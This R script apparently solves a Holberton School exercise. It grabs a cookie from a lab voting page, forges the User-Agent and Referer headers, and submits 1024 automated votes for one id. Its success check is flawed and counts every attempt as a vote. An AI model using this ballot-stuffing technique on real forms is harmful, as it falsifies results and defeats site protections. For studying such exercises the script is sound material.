# ===---Description------------------------------------------------------------===
#   Solution for the Hodor Project, Level 2 by Julien Barbier.
#   Using a R Language script with httr library.
#   To run this file install R language and run:
#   $ R -f filename
#
#   by Alexandro de Oliveira, for Holberton School
# ===---------------------------------------------------------------------------===

library('httr')

url     <- "http://173.246.108.142/level2.php"
head    <- HEAD(url)            # Head request
cookie  <- cookies(head)$value
body    <- list(id = "23", holdthedoor = "submit", key = cookie)
header  <- add_headers("User-Agent" = "Windows NT 5.1 - havk64 R Language Requests", "Referer" = url)

for(i in 1:1024) {
    p <- POST(url, body = body, encode = "form", header)
    s <- content(p, "text", encoding = 'UTF8')[1]
    match = grep("I voted!", s, perl=TRUE, value=FALSE) # Regexp to check of vote is valid.
    if(!is.null(match)) {
        cat("Vote number: ", i , "\n")
    } else {
        cat( "Failed...", "\n")
    }
}
